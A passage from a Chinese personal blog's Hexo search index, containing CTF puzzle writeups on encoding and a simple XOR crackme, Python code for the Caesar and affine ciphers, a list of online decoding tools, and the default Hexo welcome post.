‘g’的，我就在想是换了位置的（因为我没有想到flag最后的字符串最后居然都是没有意义的），我就觉得每一小节字符串后面的数字就是他们换位置的密钥，就这样分组Hhbe1、cie93、bfTFbcc2、hl94、e2、ea1、c91、rgab5、fei3432、Tse498。我之前好像看到过类似于这种的分组加密的这种，但现在找不到了，后面找到了再写上</p><hr><h3 id="3、低音吉他谱"><a href="#3、低音吉他谱" class="headerlink" title="3、低音吉他谱"></a>3、低音吉他谱</h3><p>拿到文件，里面有一张图片和一个txt文档</p>    <figure class="figure-image">      <img src="/picture/金盾杯/music1.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/金盾杯/music2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>打开图片，是一张乐谱（暂时看不出什么玄机，猜测会不会是之后通过文本解密后再和乐谱对照得到最终的flag）</p><p>再看看txt文档</p>    <figure class="figure-image">      <img src="/picture/金盾杯/music3.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>由大写字母和数字构成猜测是Base32<br>解密后得到的文本由大小写字母和数字组成猜测是Base64<br>再次解密后的文本由大写字母和数字构成猜测是Base32<br>再次解密后的文本由大写字母和数字构成猜测是Base32</p><p>发现全是Base加密，直接上Base全家桶<br><a href="#api">mufeedvh/basecrack: Decode All Bases - Base Scheme Decoder (github.com)</a></p><font size=2>安装教程链接里面有，我就记录一下常用的用法最好在cmd命令行中运行，而不是在git里面在解密的过程中不要在前面多复制了一个空格，否则可能发生错误python  basecrack.py  #输入这个之后回车（是python而不是python3！！），就可以把你要解密的Base输进去，在回车即可python  basecrack.py  -f  file.txt #将你要解密的Base字符放进file.txt文档</font>    <figure class="figure-image">      <img src="/picture/金盾杯/music4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>这一步是个关键，用一般的在线加密软件解不出来这个Base85，直接让用户在basecrack里面输入也是解不出来的，在反复尝试之后放到一个文本文档中在进行解密，即可</p>    <figure class="figure-image">      <img src="/picture/金盾杯/music5.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>接着一直解密即可得到flag（在解密的过程中不要在前面多复制了一个空格，否则可能发生错误）<br>(题目中的音谱应该是为了迷惑大家的）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>古典密码原理实现</title>
      <link href="/2021/11/29/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/11/29/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1、ceasar"><a href="#1、ceasar" class="headerlink" title="1、ceasar"></a>1、ceasar</h1>    <figure class="figure-image">      <img src="/picture/kaisa.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>cipher=<span class="hljs-string">&quot;zhongguo&quot;</span>   <span class="hljs-comment">#明文</span><br>move=<span class="hljs-number">3</span>              <span class="hljs-comment">#移位数</span><br>t=<span class="hljs-string">&quot;&quot;</span>                <span class="hljs-comment">#密文</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+move)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+move)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">else</span>:<br>        t+=i<br><span class="hljs-built_in">print</span>(t)<br>        <br><span class="hljs-comment">#如果要解密的话，秘钥变为负数</span><br><span class="hljs-comment">#如zhongguo加密后得到ckrqjjxr</span><br><span class="hljs-comment">#现需要解密，则直接将move取-3即可</span><br><br></code></pre></td></tr></table></figure><h1 id="2、affine"><a href="#2、affine" class="headerlink" title="2、affine"></a>2、affine</h1>    <figure class="figure-image">      <img src="/picture/affine.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#加密</span><br>cipher=<span class="hljs-string">&#x27;zhongguo&#x27;</span><span class="hljs-comment">#明文</span><br>t=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#密文</span><br>a=<span class="hljs-number">3</span><br>b=<span class="hljs-number">4</span> <span class="hljs-comment">#E(x)=ax+b,gcd(a,26)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cipher:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+((a*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))+b)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span>&lt;=i&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>:<br>        t+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+((a*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))+b)%<span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">else</span>:<br>        t+=i<br><span class="hljs-built_in">print</span>(t)<br><br><br><span class="hljs-comment">#解密</span><br>t = <span class="hljs-string">&#x27;bzurwwmu&#x27;</span>  <span class="hljs-comment"># 密文</span><br>cipher = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 明文</span><br>a = <span class="hljs-number">3</span><br>b = <span class="hljs-number">4</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">26</span>):<br>    <span class="hljs-keyword">if</span> (i*a) % <span class="hljs-number">26</span> == <span class="hljs-number">1</span>:<br>        a1 = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>        cipher += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+((a1*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)-b)) % <span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>        cipher += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+((a1*(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)-b)) % <span class="hljs-number">26</span>))<br>    <span class="hljs-keyword">else</span>:<br>        cipher += i<br><span class="hljs-built_in">print</span>(cipher)<br><br>    <br></code></pre></td></tr></table></figure><h1 id="3、多表代换密码"><a href="#3、多表代换密码" class="headerlink" title="3、多表代换密码"></a>3、多表代换密码</h1><p>先说下这个方法必要的基础知识</p><p>因为解密的时候需要矩阵求逆，所以写下方法，这个是最基本的方法</p>    <figure class="figure-image">      <img src="/picture/keniju1.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>行列式怎么求好像也不太记得了，看个例子应该就能马上想起来了</p>    <figure class="figure-image">      <img src="/picture/keniju2.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>可逆矩阵另一种比较简单一点的求法</p>    <figure class="figure-image">      <img src="/picture/keniju3.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/duobiao.jpg" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto在线解密网站</title>
      <link href="/2021/11/28/Crypto%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%BD%91%E7%AB%99/"/>
      <url>/2021/11/28/Crypto%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cmd5.com/">MD5</a><br><a href="http://tool.geekapp.cn/">MD5加密</a><br><a href="http://ctf.bugku.com/tool/railfence">栏栅密码</a><br><a href="http://www.urlencode.com.cn/">url</a><br><a href="http://www.hiencode.com/rot13.html">ROT13</a><br><a href="http://www.txttool.com/t/?id=Mzg1">morse</a><br><a href="http://www.hiencode.com/quoted.html">Quoted-printable</a><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒</a><br><a href="https://quipqiup.com/">进阶凯撒爆破</a><br><a href="https://www.codeeeee.com/encrypt/rabbit.html">Rabbit</a><br><a href="http://tools.jb51.net/jisuanqi/factor_calc">分解质因数</a><br><a href="http://tool.geekapp.cn/base64.php">Base64</a><br><a href="https://ctf.bugku.com/tool/base32">Base32</a><br><a href="https://ctf.bugku.com/tool/base16">Base16</a><br><a href="http://code.mcdvisa.com/">中文电码</a><br><a href="https://www.xiao84.com/tools/103177.html">猪圈密码</a><br><a href="http://www.hiencode.com/uu.html">UUencode</a><br><a href="https://www.sojson.com/hexadecimal.html">十六进制转文本</a><br><a href="http://www.liminba.com/tool/jsfuckdecode/">jsfuck解密</a><br><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a><br><a href="http://hi.pcmoe.net/buddha.html">与佛论禅+MD5+兽音+熊音+AES+BASE64</a><br><a href="http://www.hiencode.com/cvencode.html">核心价值观</a><br><a href="https://www.qqxiuzi.cn/bianma/rot5-13-18-47.php">ROT5/13/18/47编码转换</a><br><a href="http://tool.bugku.com/peigen/">培根加密</a><br><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">维吉尼亚加密</a><br><a href="https://www.sojson.com/encrypt.html">AES</a><br><a href="https://tool.oschina.net/encode?type=4">Unicode、UTF-8、ASCII、URL</a><br><a href="https://pinyin.supfree.net/">在线汉字转拼音 </a></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse ez_xor writeup</title>
      <link href="/2021/11/28/reverse-ez-xor-writeup/"/>
      <url>/2021/11/28/reverse-ez-xor-writeup/</url>
      
        <content type="html"><![CDATA[<p>拿到ez_xor.exe附件直接丢进PE<br><img src="https://img-blog.csdnimg.cn/2a919819266940108748e2605589b227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>可以看到是64位exe文件，丢进ida64<br>Shift+F12查看字符串（如果是笔记本电脑的话，F12自带热键，先按Fn，即Fn+Shift+F12）<br><img src="https://img-blog.csdnimg.cn/6204f03ae29740ff9039c7cfc41b3fa8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一般在这里找有没有和flag相关的字符串，可以看到这里是有的，双击进入<br><img src="https://img-blog.csdnimg.cn/064b1084cb0745d6b4beb3bdc19f2c8a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到该字符串，点击上图所示，进入main方法<br>会进入流程图界面，按空格进入文本界面<br>可以看到汇编代码了，按F5（同理如果是笔记本记得按Fn+F5）反汇编，转换成C语言<br><img src="https://img-blog.csdnimg.cn/40c5945e9d804f2a8b9ce453e8960077.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>现在就可以分析代码了，这里的C语言可能数据类型之类的会和我们平时的有点不一样<br>比如说这里的v3=0i64，0i64表示int64_t类型的0，其实就基本上可以理解为0<br>这里代码可以看到关键异或代码while ( (char)(v3 ^ v5[v3]) == dword_403020[v3] )<br><img src="https://img-blog.csdnimg.cn/c717f970db7d4487b7eafd0a6e1f18f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6143bf343b1c42e3a388745da52b5818.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到该字符串每个字符对应的ASCII码（这里按R键即可看到对应的字符）<br>现在已知dword_403020和v3（v3就是0~31），逐个进行异或即可得到flag</p><p>写一个Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">s=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x6C</span>,<span class="hljs-number">0x69</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x73</span>,<span class="hljs-number">0x72</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x29</span>]<br>flag=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)] <span class="hljs-comment">#从给出的代码很容易看到flag是32位的</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    flag[i]=i^s[i]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>即可得出flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/10/24/hello-world/"/>
      <url>/2021/10/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span> <span class="hljs-comment">#双引号里面这篇博客的标题</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
